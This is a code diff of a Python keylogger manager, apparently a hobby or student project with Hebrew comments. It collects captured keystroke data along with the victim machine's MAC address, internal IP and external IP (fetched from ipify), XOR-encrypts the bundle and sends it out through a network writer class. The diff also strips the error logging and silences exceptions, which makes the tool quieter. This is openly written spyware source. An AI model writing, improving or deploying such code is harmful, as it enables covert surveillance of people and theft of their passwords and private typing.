@@ -3,18 +3,10 @@ from encryptor import Encryptor
 from file_wirter import FileWriter
 from network_writer import NetworkWriter
 from getmac import get_mac_address
-import getmac
 import requests
 import socket
 import time
-import logging
 
-logging.basicConfig(
-    filename="keylogger.log",
-    level=logging.ERROR,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    force=True
-)
 
 class KeyloggerManager:
 
@@ -24,12 +16,12 @@ class KeyloggerManager:
         self.encryptor = Encryptor()
         self.file_writer = FileWriter()
         self.network_writer = NetworkWriter()
-        #כאן אני בודק האם יש שגיאה כלשהיא בהפעלה ומדפיס אותה לקישור פרטי
         self.main()
 
-    def main(self):
+    def main(self) ->None:
         while self.active:
             try:
+                time.sleep(10)
                 data = self.keylogger.data
                 # אולי עדיף להצפין גם את הכתובת מאק
                 mac_name = self.get_mac_details()
@@ -39,23 +31,23 @@ class KeyloggerManager:
                            "external_ip" : external_ip,
                            "data" : data}
                 wrapper = self.encryptor.xor(wrapper)
-                self.network_writer.send_data(wrapper)
-                time.sleep(60)
+                if self.network_writer.send_data(wrapper):
+                    self.stop()
             except Exception as e:
-                logging.error(e)
+                pass
 
 
     @staticmethod
-    def get_mac_details():
+    def get_mac_details() -> str:
         return get_mac_address()
 
     @staticmethod
-    def get_ip_details():
+    def get_ip_details() ->tuple:
         internal_ip = socket.gethostbyname(socket.gethostname())
         external_ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
         return internal_ip,external_ip
 
-    def stop(self):
+    def stop(self) -> None:
         self.active = False
 
 if __name__ == '__main__':
